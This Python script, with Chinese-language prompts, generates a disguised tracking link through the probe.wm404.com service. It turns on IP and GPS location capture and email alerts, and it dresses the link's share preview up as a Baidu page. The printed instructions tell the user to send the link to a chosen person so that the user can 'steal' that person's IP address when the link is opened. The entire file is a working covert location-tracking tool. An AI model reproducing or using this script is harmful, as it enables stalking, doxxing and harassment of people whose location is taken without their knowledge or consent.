import requests
print("1.归鹤IP探针py版\n2.官方快手GHYYDS52\n3.QQ号可以随便输入QQ邮箱一定要自己的\n4.官方TT号683444113别被骗了被骗跟作者无关")

qq_number = input("请输入QQ号：")
email = input("请输入邮箱：")

url = 'https://probe.wm404.com/?action=probe_add'
headers = {
    'Host': 'probe.wm404.com',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Sec-Fetch-Site': 'none',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'zh-CN,zh-Hans;q=0.9',
    'Sec-Fetch-Mode': 'navigate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'null',
    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
    'Content-Length': '505',
    'Connection': 'keep-alive',
    'Cookie': '__51uvsct__Jrd9iNlqJ0pM537x=2; __51vcke__Jrd9iNlqJ0pM537x=267a2bcb-0ffe-5818-9107-6563aa2edc7b; __51vuft__Jrd9iNlqJ0pM537x=1703902818149; __vtins__Jrd9iNlqJ0pM537x=%7B%22sid%22%3A%20%22151d7e9e-9f1d-564b-a679-ebd4b137aefc%22%2C%20%22vd%22%3A%201%2C%20%22stt%22%3A%200%2C%20%22dr%22%3A%200%2C%20%22expires%22%3A%201703904833829%2C%20%22ct%22%3A%201703903033829%7D'
}

data = f'add_key={qq_number}&add_probe_page=404&add_ip_location_function=on&add_gps_location_function=on&add_email_notification_function=on&add_email={email}&add_qqshare_title=%E7%99%BE%E5%BA%A6%E4%B8%80%E4%B8%8B%2C%E4%BD%A0%E5%B0%B1%E7%9F%A5%E9%81%93&add_qqshare_pics=https%3A%2F%2Fwww.baidu.com%2Fimg%2Fbaidu.gif&add_qqshare_summary=%E7%99%BE%E5%BA%A6%E4%B8%80%E4%B8%8B%2C%E4%BD%A0%E5%B0%B1%E7%9F%A5%E9%81%93&add_qqshare_desc=%E7%99%BE%E5%BA%A6%E4%B8%80%E4%B8%8B%2C%E4%BD%A0%E5%B0%B1%E7%9F%A5%E9%81%93'

response = requests.post(url, headers=headers, data=data)
print("https://probe.wm404.com/probe.php?key=" + response.text.split('<a target="_blank" href="')[1].split('">')[0])
print("❗友情提示\n复制第二个链接千万别复制第一个\n否则偷不到对面IP地址\n复制后发给你要看的人\n如果对方打开了你就邮箱可以收到")
